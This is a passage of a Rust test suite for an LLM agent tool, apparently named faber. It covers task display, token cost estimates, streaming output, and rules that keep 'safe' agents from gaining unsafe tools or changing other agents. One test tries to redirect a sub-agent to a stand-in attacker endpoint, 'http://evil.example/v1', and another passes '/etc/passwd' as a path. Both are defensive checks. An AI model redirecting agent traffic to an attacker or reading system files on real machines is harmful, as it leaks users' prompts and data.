        task.last_result = Some("line one\nline two".to_string());
        let text = describe_task(&task, &[], now);
        for expected in [
            "Task #7",
            "Name:         nightly",
            "Kind:         prompt",
            "Runs on:      any agent",
            "Schedule:     cron \"0 0 3 * * * *\"",
            "(in 15h)",
            "Runs:         2 of at most 5",
            "Last outcome: failed (exit code 2)",
            "Command:\n    Summarize the day.\n    Keep it short.",
            "Last result:\n    line one\n    line two",
        ] {
            assert!(text.contains(expected), "missing {expected:?} in:\n{text}");
        }
        assert!(
            !text.contains("Description:"),
            "empty description is left out"
        );
    }

    #[test]
    fn test_first_line() {
        assert_eq!(first_line("\n  hello world\nmore", 40), "hello world");
        assert_eq!(first_line("abcdefgh", 5), "abcd…");
    }

    #[test]
    fn test_parse_chat_command_cost() {
        assert!(matches!(parse_chat_command("/cost"), ChatCommand::Cost));
    }

    #[test]
    fn test_session_usage_record_accumulates_across_calls() {
        let mut usage = SessionUsage::default();
        usage.record(&openai::Usage {
            prompt_tokens: Some(100),
            completion_tokens: Some(20),
            total_tokens: Some(120),
        });
        usage.record(&openai::Usage {
            prompt_tokens: Some(50),
            completion_tokens: Some(10),
            total_tokens: Some(60),
        });
        assert_eq!(usage.turns, 2);
        assert_eq!(usage.prompt_tokens, 150);
        assert_eq!(usage.completion_tokens, 30);
        assert_eq!(usage.total_tokens, 180);
    }

    #[test]
    fn test_session_usage_record_missing_fields_count_as_zero_not_skipped() {
        // A response reporting *no* usage at all is never passed to
        // record() in the first place (see the call sites) - but one that
        // reports a Usage struct with some fields missing still counts as
        // a turn, just contributing 0 for whichever fields are absent.
        let mut usage = SessionUsage::default();
        usage.record(&openai::Usage {
            prompt_tokens: Some(100),
            completion_tokens: None,
            total_tokens: None,
        });
        assert_eq!(usage.turns, 1);
        assert_eq!(usage.prompt_tokens, 100);
        assert_eq!(usage.completion_tokens, 0);
        assert_eq!(usage.total_tokens, 0);
    }

    #[test]
    fn test_estimate_cost_usd_multiplies_tokens_by_per_token_rate() {
        let usage = SessionUsage {
            turns: 1,
            prompt_tokens: 1_000_000,
            completion_tokens: 500_000,
            total_tokens: 1_500_000,
        };
        let pricing = openai::Pricing {
            prompt: "0.000003".to_string(),
            completion: "0.000015".to_string(),
            request: None,
            image: None,
            web_search: None,
            internal_reasoning: None,
            input_cache_read: None,
            input_cache_write: None,
        };
        // 1_000_000 * 0.000003 + 500_000 * 0.000015 = 3.0 + 7.5 = 10.5
        assert_eq!(estimate_cost_usd(&usage, &pricing), Some(10.5));
    }

    #[test]
    fn test_estimate_cost_usd_unparseable_rate_is_none() {
        let usage = SessionUsage::default();
        let pricing = openai::Pricing {
            prompt: "not a number".to_string(),
            completion: "0.000015".to_string(),
            request: None,
            image: None,
            web_search: None,
            internal_reasoning: None,
            input_cache_read: None,
            input_cache_write: None,
        };
        assert_eq!(estimate_cost_usd(&usage, &pricing), None);
    }

    #[test]
    fn test_parse_chat_command_message() {
        match parse_chat_command("hello world") {
            ChatCommand::Message(msg) => assert_eq!(msg, "hello world"),
            _ => panic!("expected Message"),
        }
    }

    #[test]
    fn test_parse_chat_command_empty() {
        assert!(matches!(parse_chat_command(""), ChatCommand::Empty));
    }

    #[test]
    fn test_parse_chat_command_unknown() {
        assert!(matches!(
            parse_chat_command("/unknown"),
            ChatCommand::Invalid(_)
        ));
    }

    #[test]
    fn test_parse_chat_command_backslash_prefix() {
        assert!(matches!(parse_chat_command("\\help"), ChatCommand::Help));
    }

    #[test]
    fn test_stream_steps_no_newline_is_one_partial_step() {
        assert_eq!(
            stream_steps("hello"),
            vec![StreamStep::Partial("hello".to_string())]
        );
    }

    #[test]
    fn test_stream_steps_empty_chunk_finishes() {
        // The end-of-stream signal: finish whatever's open (a no-op if
        // nothing is, but the caller doesn't need to know that).
        assert_eq!(stream_steps(""), vec![StreamStep::Finish]);
    }

    #[test]
    fn test_stream_steps_trailing_newline_after_the_text() {
        assert_eq!(
            stream_steps("hello\n"),
            vec![
                StreamStep::Partial("hello".to_string()),
                StreamStep::Newline
            ]
        );
    }

    #[test]
    fn test_stream_steps_bare_newline_with_no_partial() {
        // A lone newline (e.g. the blank line between two paragraphs)
        // must not synthesize an empty Partial step, but must still be a
        // real Newline (not the safe-no-op Finish) so the blank line is
        // actually preserved.
        assert_eq!(stream_steps("\n"), vec![StreamStep::Newline]);
    }

    #[test]
    fn test_stream_steps_multiple_lines_in_one_chunk() {
        assert_eq!(
            stream_steps("a\nb\nc"),
            vec![
                StreamStep::Partial("a".to_string()),
                StreamStep::Newline,
                StreamStep::Partial("b".to_string()),
                StreamStep::Newline,
                StreamStep::Partial("c".to_string()),
            ]
        );
    }

    #[test]
    fn test_stream_steps_blank_line_between_two_lines() {
        assert_eq!(
            stream_steps("a\n\nb"),
            vec![
                StreamStep::Partial("a".to_string()),
                StreamStep::Newline,
                StreamStep::Newline,
                StreamStep::Partial("b".to_string()),
            ]
        );
    }

    struct CapturingPrinter {
        chunks: Arc<Mutex<Vec<String>>>,
    }

    impl rustyline::ExternalPrinter for CapturingPrinter {
        fn print(&mut self, msg: String) -> rustyline::Result<()> {
            self.chunks.lock().unwrap().push(msg);
            Ok(())
        }
    }

    fn capturing_chat_printer() -> (ChatPrinter, Arc<Mutex<Vec<String>>>) {
        let chunks = Arc::new(Mutex::new(Vec::new()));
        let printer = ChatPrinter::new();
        printer.set_printer(Box::new(CapturingPrinter {
            chunks: chunks.clone(),
        }));
        printer.set_direct_mode(false);
        (printer, chunks)
    }

    /// What would actually appear on screen: every captured write,
    /// ANSI-stripped, concatenated in order - never mind how many separate
    /// writes it took to get there, since a terminal just concatenates
    /// whatever bytes it receives.
    fn captured_text(chunks: &Arc<Mutex<Vec<String>>>) -> String {
        chunks
            .lock()
            .unwrap()
            .iter()
            .map(|c| console::strip_ansi_codes(c).to_string())
            .collect()
    }

    #[test]
    fn test_line_streamer_end_of_stream_with_nothing_open_prints_nothing() {
        // The end-of-stream flush (an empty chunk) must not print a
        // spurious blank line when the stream had already closed out
        // cleanly (e.g. its last chunk ended in a real newline) - or, as
        // here, never printed anything at all.
        let (printer, chunks) = capturing_chat_printer();
        let stream = line_streamer(printer, Style::new());
        stream("").unwrap();
        assert_eq!(captured_text(&chunks), "");
    }

    #[test]
    fn test_line_streamer_is_visible_before_a_newline_arrives() {
        // The whole point: text must appear as soon as it arrives, not
        // once buffered up to some threshold or a full line.
        let (printer, chunks) = capturing_chat_printer();
        let stream = line_streamer(printer, Style::new());
        stream("partial, no newline yet").unwrap();
        assert_eq!(captured_text(&chunks), "partial, no newline yet");
    }

    #[test]
    fn test_line_streamer_across_chunk_boundaries() {
        // Text arriving in arbitrarily small pieces must still concatenate
        // correctly, and a real newline mid-chunk must be preserved.
        // (Whether the end-of-stream flush then closes the still-open
        // "second line" is a `finish_partial_line` concern tested directly
        // at the status_bar::apply() level - indirect mode, used here only
        // for capturability, has no concept of an open partial line to
        // close.)
        let (printer, chunks) = capturing_chat_printer();
        let stream = line_streamer(printer, Style::new());
        stream("hel").unwrap();
        stream("lo ").unwrap();
        stream("world\nsecond line").unwrap();
        assert_eq!(captured_text(&chunks), "hello world\nsecond line");
    }

    #[test]
    fn test_line_streamer_never_loses_content_with_no_newlines() {
        // A model stuck repeating itself with no line breaks: every
        // character sent in must show up, with nothing held back
        // invisibly regardless of how long the response runs.
        let (printer, chunks) = capturing_chat_printer();
        let stream = line_streamer(printer, Style::new());
        for _ in 0..10 {
            stream(&"x".repeat(100)).unwrap();
        }
        assert_eq!(captured_text(&chunks), "x".repeat(1000));
    }

    #[test]
    fn test_line_streamer_preserves_blank_lines() {
        let (printer, chunks) = capturing_chat_printer();
        let stream = line_streamer(printer, Style::new());
        stream("first\n\nsecond\n").unwrap();
        assert_eq!(captured_text(&chunks), "first\n\nsecond\n");
    }

    #[test]
    fn test_format_tool_arguments_short() {
        assert_eq!(
            format_tool_arguments(r#"{"path":"foo"}"#),
            r#"{"path":"foo"}"#
        );
    }

    #[test]
    fn test_format_tool_arguments_long_truncated() {
        let long_args = "a".repeat(100);
        let result = format_tool_arguments(&long_args);
        assert!(result.contains("..."));
        assert!(result.contains("(100)"));
    }

    #[test]
    fn test_format_tool_arguments_newlines_removed() {
        let args = "line1\nline2\tline3";
        let result = format_tool_arguments(args);
        assert!(!result.contains('\n'));
        assert!(!result.contains('\t'));
    }

    #[test]
    fn test_preview_partial_tool_arguments_nothing_yet() {
        assert_eq!(preview_partial_tool_arguments(""), None);
        assert_eq!(preview_partial_tool_arguments("{"), None);
        assert_eq!(preview_partial_tool_arguments(r#"{"pa"#), None);
        assert_eq!(preview_partial_tool_arguments("not json"), None);
    }

    #[test]
    fn test_preview_partial_tool_arguments_incomplete_string_value() {
        // The key is complete but the value's closing quote hasn't arrived.
        assert_eq!(preview_partial_tool_arguments(r#"{"path":"Cargo.t"#), None);
    }

    #[test]
    fn test_preview_partial_tool_arguments_single_complete_pair() {
        // Complete even though the outer object hasn't closed yet - this is
        // the common single-argument case (e.g. read_file) where waiting
        // for a top-level comma would never show anything.
        assert_eq!(
            preview_partial_tool_arguments(r#"{"path":"Cargo.toml"#),
            None
        );
        assert_eq!(
            preview_partial_tool_arguments(r#"{"path":"Cargo.toml""#),
            Some(r#"path="Cargo.toml""#.to_string())
        );
    }

    #[test]
    fn test_preview_partial_tool_arguments_keeps_earlier_pairs_when_later_one_is_incomplete() {
        let partial = r#"{"path":"Cargo.toml","old_content":"fo"#;
        assert_eq!(
            preview_partial_tool_arguments(partial),
            Some(r#"path="Cargo.toml""#.to_string())
        );
    }

    #[test]
    fn test_preview_partial_tool_arguments_multiple_complete_pairs() {
        let complete = r#"{"path":"Cargo.toml","replace_all":true}"#;
        assert_eq!(
            preview_partial_tool_arguments(complete),
            Some(r#"path="Cargo.toml", replace_all=true"#.to_string())
        );
    }

    #[test]
    fn test_preview_partial_tool_arguments_number_bool_null() {
        assert_eq!(
            preview_partial_tool_arguments(r#"{"n":42,"ok":false,"x":null,"#),
            Some("n=42, ok=false, x=null".to_string())
        );
        // A number isn't complete just because the buffer ends right after
        // it - more digits could still be coming.
        assert_eq!(preview_partial_tool_arguments(r#"{"n":4"#), None);
    }

    #[test]
    fn test_preview_partial_tool_arguments_nested_value() {
        let partial = r#"{"options":{"a":1,"b":2},"path":"x"#;
        assert_eq!(
            preview_partial_tool_arguments(partial),
            Some(r#"options={"a":1,"b":2}"#.to_string())
        );
    }

    #[test]
    fn test_preview_partial_tool_arguments_escaped_quote_in_string() {
        let args = r#"{"content":"say \"hi\""}"#;
        assert_eq!(
            preview_partial_tool_arguments(args),
            Some(r#"content="say \"hi\"""#.to_string())
        );
    }

    #[test]
    fn test_preview_partial_tool_arguments_never_produces_multiple_lines() {
        // A value with an embedded real newline (e.g. a pretty-printed
        // nested object, or an unescaped control character some server
        // tolerates) must never turn into an actual line break on the
        // status line.
        let with_newline_in_nested_value = "{\"options\":{\"a\":\n1}}";
        let preview = preview_partial_tool_arguments(with_newline_in_nested_value).unwrap();
        assert!(
            !preview.contains('\n'),
            "preview contained a newline: {:?}",
            preview
        );

        let with_raw_newline_in_string = "{\"content\":\"line1\nline2\"}";
        if let Some(preview) = preview_partial_tool_arguments(with_raw_newline_in_string) {
            assert!(
                !preview.contains('\n'),
                "preview contained a newline: {:?}",
                preview
            );
        }
    }

    #[test]
    fn test_agent_color_hash_deterministic() {
        let hash1 = agent_color_hash("alice");
        let hash2 = agent_color_hash("alice");
        assert_eq!(hash1, hash2);
    }

    #[test]
    fn test_agent_color_hash_different_agents() {
        let hash1 = agent_color_hash("alice");
        let hash2 = agent_color_hash("bob");
        assert_ne!(hash1, hash2);
    }

    #[test]
    fn test_agent_ansi_code_in_range() {
        for name in &["alice", "bob", "charlie", "default", "xyz"] {
            let code = agent_ansi_code(name);
            assert!(AGENT_ANSI_CODES.contains(&code));
        }
    }

    fn test_db_conn() -> Arc<Mutex<rusqlite::Connection>> {
        let conn = rusqlite::Connection::open_in_memory().unwrap();
        db::initialize_db(&conn).unwrap();
        Arc::new(Mutex::new(conn))
    }

    fn plan_test_ctx() -> ToolContext {
        let db = LocalDb::new(test_db_conn());
        db.ensure_default_agent().unwrap();
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.db = Some(Arc::new(db));
        ctx.agent_name = Some("default".to_string());
        ctx
    }

    #[test]
    fn test_a_fan_outs_workers_are_removed_once_done() {
        let conn = test_db_conn();
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(conn.clone()));
        db.create_agent("boss", "").unwrap();
        let ctx = ToolContext::new(|_: &str| {});
        make_worker_agent(db.as_ref(), "boss-item-1", "boss", &ctx, "s").unwrap();
        db.release_agent("boss-item-1", "s").unwrap();
        // Just done: still shown.
        assert!(remove_one_job_agents_done(db.as_ref()).unwrap().is_empty());
        conn.lock()
            .unwrap()
            .execute_batch(
                "UPDATE agents SET activity = 'finished', activity_at = datetime('now', '-1 hour')
                 WHERE name = 'boss-item-1'",
            )
            .unwrap();
        assert_eq!(
            remove_one_job_agents_done(db.as_ref()).unwrap(),
            ["boss-item-1"]
        );
        assert!(db.get_agent("boss-item-1").unwrap().is_none());
        assert!(db.get_agent("boss").unwrap().is_some());
    }

    #[test]
    fn test_a_safe_agent_isnt_offered_what_only_unsafe_ones_may_ask_for() {
        let safe = initialize_tools(false, None);
        let all = initialize_tools(true, None);
        for name in [
            "agent_create",
            "agent_configure",
            "spawn_agent",
            "task_create",
        ] {
            let params = |tools: &ToolsCollection| -> serde_json::Value {
                serde_json::from_str::<serde_json::Value>(&tools[name].schema).unwrap()["function"]
                    ["parameters"]["properties"]
                    .clone()
            };
            assert!(params(&safe).get("unsafe_tools").is_none(), "{name}");
            assert!(params(&safe).get("cwd").is_none(), "{name}");
            assert!(params(&all).get("cwd").is_some(), "{name}");
            let description = serde_json::from_str::<serde_json::Value>(&safe[name].schema)
                .unwrap()["function"]["description"]
                .to_string();
            assert!(
                !description.contains("unsafe_tools"),
                "{name}: {description}"
            );
        }
    }

    #[test]
    fn test_a_safe_agent_changes_only_the_agents_it_made() {
        let db = local_db_with_agents(&["boss", "user-agent"]);
        let ctx = chat_ctx(db.clone(), "boss");
        let call = |f: ToolCallback, params: serde_json::Value| f(&params.to_string(), &ctx);
        // What it makes is its own: it may change, run and delete it.
        call(tool_agent_create, serde_json::json!({"name": "helper"})).unwrap();
        assert_eq!(
            db.get_agent("helper").unwrap().unwrap().parent.as_deref(),
            Some("boss")
        );
        call(
            tool_agent_configure_safe,
            serde_json::json!({"agent": "helper", "model": "m"}),
        )
        .unwrap();
        // But never where its requests go.
        let err = call(
            tool_agent_configure_safe,
            serde_json::json!({"agent": "helper", "endpoint": "http://evil.example/v1"}),
        )
        .unwrap_err()
        .to_string();
        assert!(err.contains("endpoint"), "{err}");
        assert_eq!(db.get_agent_config("helper").unwrap().endpoint, None);
        // Nor anything about agents it didn't make, nor itself: it may be
        // run with the unsafe tools later, by the user.
        for agent in ["user-agent", "boss"] {
            let err = call(
                tool_agent_configure_safe,
                serde_json::json!({"agent": agent, "model": "m"}),
            )
            .unwrap_err()
            .to_string();
            assert!(
                err.contains("isn't one of the agents you made"),
                "{agent}: {err}"
            );
            assert!(call(tool_agent_delete, serde_json::json!({"name": agent})).is_err());
            assert!(db.get_agent(agent).unwrap().is_some());
        }
        // Another agent's endpoint, key and prompt are hidden from it.
        let mut config = db.get_agent_config("user-agent").unwrap();
        config.endpoint = Some("http://private/v1".to_string());
        config.system_prompt = Some("secret plans".to_string());
        db.set_agent_config("user-agent", &config).unwrap();
        let shown = call(tool_agent_get, serde_json::json!({"name": "user-agent"})).unwrap();
        assert!(
            !shown.contains("private") && !shown.contains("secret plans"),
            "{shown}"
        );
        call(tool_agent_delete, serde_json::json!({"name": "helper"})).unwrap();

        // The name of an agent faber makes for a task or a fan-out isn't
        // taken from one that exists already, made by someone else.
        assert!(check_name_free_for(db.as_ref(), "user-agent", "worker").is_err());
        assert!(check_name_free_for(db.as_ref(), "task-99", "worker").is_ok());
        db.create_agent("task-7", "").unwrap();
        db.set_agent_parent("task-7", Some("boss")).unwrap();
        assert!(check_name_free_for(db.as_ref(), "task-7", "boss").is_ok());
        assert!(check_name_free_for(db.as_ref(), "task-7", "worker").is_err());
    }

    #[test]
    fn test_agent_configure_sets_and_clears_only_the_config() {
        // As the user's own agent, with the unsafe tools: it may change
        // itself (see test_a_safe_agent_changes_only_the_agents_it_made).
        let mut ctx = plan_test_ctx();
        ctx.unsafe_tools = true;
        let configure = |params: serde_json::Value| tool_agent_configure(&params.to_string(), &ctx);
        configure(
            serde_json::json!({"agent": "default", "model": "m1", "system_prompt": "be brief"}),
        )
        .unwrap();
        let get = || -> serde_json::Value {
            serde_json::from_str(
                &tool_agent_get(&r#"{"name":"default"}"#.to_string(), &ctx).unwrap(),
            )
            .unwrap()
        };
        assert_eq!(get()["config"]["model"], "m1");
        assert_eq!(get()["config"]["system_prompt"], "be brief");

        configure(serde_json::json!({"agent": "default", "model": ""})).unwrap();
        assert!(get()["config"]["model"].is_null(), "cleared");
        assert_eq!(
            get()["config"]["system_prompt"],
            "be brief",
            "others untouched"
        );

        assert!(configure(serde_json::json!({"agent": "nobody", "model": "x"})).is_err());
        assert!(
            configure(serde_json::json!({"agent": "default"})).is_err(),
            "nothing to set"
        );
        // Only the configuration: other stored data isn't reachable.
        assert!(
            configure(serde_json::json!({"agent": "default", "key": "state:plan", "value": "[]"}))
                .is_err()
        );
    }

    #[test]
    fn test_task_create_and_list_tools() {
        let ctx = plan_test_ctx();
        let create = |params: serde_json::Value| -> Result<serde_json::Value, String> {
            tool_task_create(&params.to_string(), &ctx)
                .map(|r| serde_json::from_str(&r).unwrap())
                .map_err(|e| e.to_string())
        };
        let joke = create(
            serde_json::json!({"name": "joke", "command": "Tell a joke", "delay_seconds": 60}),
        )
        .unwrap();
        assert_eq!(joke["kind"], "prompt");
        let tool = create(serde_json::json!({
            "name": "ls", "command": "{\"tool\": \"glob\", \"arguments\": {\"pattern\": \"*\"}}",
            "cron_expression": "0 0 9 * * * *", "max_runs": 3
        }))
        .unwrap();
        assert_eq!(tool["kind"], "tool");
        let now = create(serde_json::json!({"name": "now", "command": "Say hi"})).unwrap();

        for (params, expected) in [
            (
                serde_json::json!({"name": "x", "command": " "}),
                "needs a command",
            ),
            (
                serde_json::json!({"name": "x", "command": "y", "delay_seconds": 5, "run_at": "2026-10-03T08:00:00Z"}),
                "not both",
            ),
            (
                serde_json::json!({"name": "x", "command": "y", "cron_expression": "* * * * * * *", "delay_seconds": 5}),
                "not both",
            ),
            (
                serde_json::json!({"name": "x", "command": "y", "max_runs": 2}),
                "max_runs",
            ),
            (
                serde_json::json!({"name": "x", "command": "y", "agent_name": "nobody"}),
                "no agent named",
            ),
        ] {
            let err = create(params).unwrap_err();
            assert!(err.contains(expected), "{err}");
        }

        let list = |params: serde_json::Value| -> serde_json::Value {
            serde_json::from_str(&tool_task_list(&params.to_string(), &ctx).unwrap()).unwrap()
        };
        let all = list(serde_json::json!({}));
        assert_eq!(all.as_array().unwrap().len(), 3);
        assert_eq!(
            all[0]["agent_name"], "default",
            "defaults to the calling agent"
        );
        let due = list(serde_json::json!({"due": true}));
        assert_eq!(due.as_array().unwrap().len(), 1);
        assert_eq!(due[0]["id"], now["id"]);
        assert_eq!(list(serde_json::json!({"id": joke["id"]}))["name"], "joke");
        assert!(list(serde_json::json!({"id": 999}))["error"].is_string());
    }

    #[test]
    fn test_github_tools_check_their_arguments_before_any_request() {
        let ctx = test_ctx();
        let err = |f: ToolCallback, params: serde_json::Value| {
            f(&params.to_string(), &ctx).unwrap_err().to_string()
        };
        assert!(
            err(
                tool_github_issue,
                serde_json::json!({"repo": "o/r", "comments": true})
            )
            .contains("number")
        );
        assert!(
            err(
                tool_github_pull_request,
                serde_json::json!({"repo": "o/r", "patch": true})
            )
            .contains("number")
        );
        // The old tools' parameter names are refused, not misread.
        assert!(
            err(
                tool_github_issue,
                serde_json::json!({"repo": "o/r", "issue": 5})
            )
            .contains("unknown field")
        );
        assert!(
            err(
                tool_github_pull_request,
                serde_json::json!({"repo": "o/r", "pull_request": 5})
            )
            .contains("unknown field")
        );
    }

    /// A tool context like a chat's, as `agent`, over `db`, with the
    /// dummy model behind sub-agents.
    fn chat_ctx(db: Arc<dyn DbBackend>, agent: &str) -> ToolContext {
        chat_ctx_with_model(db, agent, "dummy")
    }

    fn chat_ctx_with_model(db: Arc<dyn DbBackend>, agent: &str, model: &str) -> ToolContext {
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.db = Some(db);
        ctx.agent_name = Some(agent.to_string());
        ctx.extra = Some(Arc::new(SubAgentContext {
            runs: Arc::new(SubAgentRuns::default()),
            tools: Arc::new(initialize_tools(false, None)),
            opts: script_opts(model),
            session_id: "test-session".to_string(),
            active_subagents: Arc::new(std::sync::atomic::AtomicUsize::new(0)),
            running_subagents: Arc::new(Mutex::new(HashMap::new())),
            status_bar: Arc::new(status_bar::StatusBar::new()),
            session_usage: Arc::new(Mutex::new(SessionUsage::default())),
            profiles: Default::default(),
        }));
        ctx
    }

    fn local_db_with_agents(agents: &[&str]) -> Arc<dyn DbBackend> {
        let db: Arc<dyn DbBackend> = Arc::new(LocalDb::new(test_db_conn()));
        for agent in agents {
            db.create_agent(agent, "").unwrap();
        }
        db
    }

    fn script_opts(model: &str) -> openai::Opts {
        openai::Opts {
            max_tokens: None,
            model: model.to_string(),
            endpoint: String::new(),
            tool_choice: None,
            api_key: None,
            max_retries: None,
            retry_base_delay_secs: None,
            parameters: Default::default(),
        }
    }

    /// Writes a model script (see `scripted_llm`) and returns its `--model`.
    fn model_script(name: &str, rules: serde_json::Value) -> String {
        let path = std::env::temp_dir().join(format!(
            "faber_main_script_{}_{}.json",
            name,
            std::process::id()
        ));
        std::fs::write(&path, rules.to_string()).unwrap();
        format!("script:{}", path.display())
    }

    /// A whole turn of the agent in `ctx`, with every tool.
    fn run_turn(ctx: &ToolContext, model: &str, prompt: &str) -> String {
        let response = post_request_with_mode(
            vec![make_message("user", prompt.to_string())],
            &initialize_tools(false, None),
            &script_opts(model),
            ResponseMode::Complete,
            ctx,
            None,
        )
        .unwrap();
        response.choices.unwrap()[0]
            .message
            .content
            .clone()
            .unwrap()
    }

    #[test]
    fn test_scripted_coordinator_fans_out_and_summarizes() {
        let model = model_script(
            "fanout",
            serde_json::json!([
                {"if": "triage", "tool": "fan_out",
                 "arguments": {"items": ["101", "102"], "prompt": "check issue {item}"}},
                {"if": "check issue 101", "reply": "101 is a duplicate"},
                {"if": "check issue 102", "reply": "102 needs a fix", "delay_ms": 50},
                {"if": "## 1. 101", "reply": "triaged both"},
            ]),
        );
        let db = local_db_with_agents(&["boss"]);
        let ctx = chat_ctx_with_model(db, "boss", &model);
        assert_eq!(run_turn(&ctx, &model, "please triage"), "triaged both");
        let usage = match &ctx.extra {
            Some(extra) => *extra
                .downcast_ref::<SubAgentContext>()
                .unwrap()
                .session_usage
                .lock()
                .unwrap(),
            None => unreachable!(),
        };
        assert_eq!(usage.turns, 2, "both workers' tokens counted");
    }

    #[test]
    fn test_fan_out_runs_hundreds_of_workers_at_once() {
        let model = model_script(
            "wide",
            serde_json::json!([
                {"if": "check item", "reply": "fine", "delay_ms": 200},
            ]),
        );
        let ctx = chat_ctx_with_model(local_db_with_agents(&["boss"]), "boss", &model);
        let items: Vec<String> = (0..500).map(|i| i.to_string()).collect();
        let started = std::time::Instant::now();
        let out = fan_out::tool_fan_out(
            &serde_json::json!({"items": items, "prompt": "check item {item}", "max_parallel": 256})
                .to_string(),
            &ctx,
        )
        .unwrap();
        // 500 workers of 200ms each, 256 at a time: two rounds, not 500.
        assert!(
            started.elapsed() < std::time::Duration::from_secs(5),
            "{:?}",
            started.elapsed()
        );
        assert_eq!(
            out.matches("\nfine\n").count(),
            500,
            "every worker answered"
        );
        assert!(out.contains("## 500. 499\n"));
    }

    /// Waits up to 10 seconds for `check` to hold.
    fn eventually(mut check: impl FnMut() -> bool) -> bool {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        while std::time::Instant::now() < deadline {
            if check() {
                return true;
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        false
    }

    /// The result `parent` got from its sub-agent `agent`, waiting for it.
    fn sub_agent_result(db: &Arc<dyn DbBackend>, parent: &str, agent: &str) -> String {
        let deadline = std::time::Instant::now() + std::time::Duration::from_secs(10);
        while std::time::Instant::now() < deadline {
            db.heartbeat_all("test-session").unwrap();
            for notification in db.poll_notifications_for_session("test-session").unwrap() {
                let message: serde_json::Value =
                    serde_json::from_str(&notification.message).unwrap();
                if notification.to_agent == parent && message["agent"] == agent {
                    return message["response"].as_str().unwrap().to_string();
                }
            }
            std::thread::sleep(std::time::Duration::from_millis(20));
        }
        panic!("no result from {agent}");
    }

    fn spawning_setup(name: &str, rules: serde_json::Value) -> (Arc<dyn DbBackend>, ToolContext) {
        let model = model_script(name, rules);
        let db = local_db_with_agents(&["boss", "bystander"]);
        assert!(db.claim_agent("boss", "test-session").unwrap());
        let ctx = chat_ctx_with_model(db.clone(), "boss", &model);
        (db, ctx)
    }

    /// `chat_ctx_with_model`, for an agent with the unsafe tools.
    fn unsafe_chat_ctx(db: Arc<dyn DbBackend>, agent: &str, model: &str) -> ToolContext {
        let mut ctx = chat_ctx_with_model(db, agent, model);
        let sa_ctx = ctx
            .extra
            .as_ref()
            .unwrap()
            .downcast_ref::<SubAgentContext>()
            .unwrap()
            .clone();
        ctx.extra = Some(Arc::new(SubAgentContext {
            tools: Arc::new(initialize_tools(true, None)),
            ..sa_ctx
        }));
        ctx.unsafe_tools = true;
        ctx
    }

    #[test]
    fn test_child_unsafe() {
        assert_eq!(child_unsafe(false, None), Ok(false));
        assert_eq!(child_unsafe(true, None), Ok(true));
        assert_eq!(child_unsafe(true, Some(false)), Ok(false));
        assert_eq!(child_unsafe(true, Some(true)), Ok(true));
        assert_eq!(child_unsafe(false, Some(false)), Ok(false));
        assert!(child_unsafe(false, Some(true)).is_err());
    }

    #[test]
    fn test_agent_tools_picks_the_safe_or_unsafe_versions() {
        let within = initialize_tools(true, None);
        let config = db::AgentConfig::default();
        let safe = agent_tools(&within, false, &config);
        let unsafe_ = agent_tools(&within, true, &config);
        assert!(!safe.contains_key("fetch_web_content"));
        assert!(unsafe_.contains_key("fetch_web_content"));
        // Never more than the maker has, even when unsafe.
        let narrow = agent_tools(&initialize_tools(false, None), true, &config);
        assert!(!narrow.contains_key("fetch_web_content"));
        assert!(narrow.contains_key("run_command"));
    }

    #[test]
    fn test_a_safe_agent_cannot_make_or_change_an_unsafe_one() {
        let (db, ctx) = spawning_setup("safety", serde_json::json!([{"reply": "ok"}]));
        let spawn = |ctx: &ToolContext, name: &str, unsafe_tools: Option<bool>| {
            let mut args = serde_json::json!({"name": name, "prompt": "go"});
            if let Some(u) = unsafe_tools {
                args["unsafe_tools"] = u.into();
            }
            tool_spawn_agent(&args.to_string(), ctx)
        };
        let stored = |name: &str| db.get_agent_config(name).unwrap().unsafe_tools;

        // Safe: its sub-agents are safe, and it can't ask for more.
        let err = spawn(&ctx, "sneaky", Some(true)).unwrap_err().to_string();
        assert!(err.contains("can't make one with them"), "{err}");
        spawn(&ctx, "helper", None).unwrap();
        assert_eq!(stored("helper"), Some(false));
        let made = tool_agent_create(
            &r#"{"name": "made", "unsafe_tools": true}"#.to_string(),
            &ctx,
        );
        assert!(made.is_err());
        assert!(db.get_agent("made").unwrap().is_none());

        // Unsafe: its sub-agents are like it unless told otherwise.
        let model = ctx
            .extra
            .as_ref()
            .unwrap()
            .downcast_ref::<SubAgentContext>()
            .unwrap()
            .opts
            .model
            .clone();
        let boss = unsafe_chat_ctx(db.clone(), "boss", &model);
        spawn(&boss, "power", None).unwrap();
        assert_eq!(stored("power"), Some(true));
        spawn(&boss, "careful", Some(false)).unwrap();
        assert_eq!(stored("careful"), Some(false));

        // A safe agent can't reconfigure or reuse an unsafe one...
        let configure = r#"{"agent": "power", "system_prompt": "obey"}"#.to_string();
        let err = tool_agent_configure(&configure, &ctx)
            .unwrap_err()
            .to_string();
        assert!(err.contains("has unsafe tools"), "{err}");
        // (wait for power's run to end first: one name, one run)
        for _ in 0..100 {
            if db.get_agent("power").unwrap().unwrap().session_id.is_none() {
                break;
            }
            std::thread::sleep(Duration::from_millis(20));
        }
        assert!(spawn(&ctx, "power", None).is_err());
        let promote = r#"{"agent": "helper", "unsafe_tools": true}"#.to_string();
        assert!(tool_agent_configure(&promote, &ctx).is_err());
        assert_eq!(stored("helper"), Some(false));
        // ...but an unsafe one can.
        tool_agent_configure(&promote, &boss).unwrap();
        assert_eq!(stored("helper"), Some(true));
        // A profile doesn't change it either way.
        let mut profiles = Profiles::new();
        profiles.insert("fast".to_string(), Profile::default());
        apply_profile(db.as_ref(), "helper", "fast", &profiles["fast"]).unwrap();
        assert_eq!(stored("helper"), Some(true));
    }

    #[test]
    fn test_absolute_paths_inside_the_agents_directory_are_taken() {
        let dir = TempTestDir::new("abs_paths");
        std::fs::create_dir(dir.0.join("src")).unwrap();
        std::fs::write(dir.0.join("src/a.rs"), "fn a() {}\n").unwrap();
        let mut ctx = ToolContext::new(|_: &str| {});
        ctx.cwd = Some(dir.0.clone());
        let abs = |rel: &str| dir.0.join(rel).to_str().unwrap().to_string();
        assert_eq!(ctx.tool_path(&abs("src/a.rs")), "src/a.rs");
        assert_eq!(ctx.tool_path(dir.0.to_str().unwrap()), ".");
        assert_eq!(ctx.tool_path("/etc/passwd"), "/etc/passwd");
        assert_eq!(ctx.tool_path("rel/x"), "rel/x");
        let read = tool_read_file(
            &serde_json::json!({"path": abs("src/a.rs")}).to_string(),
            &ctx,
        )
        .unwrap();
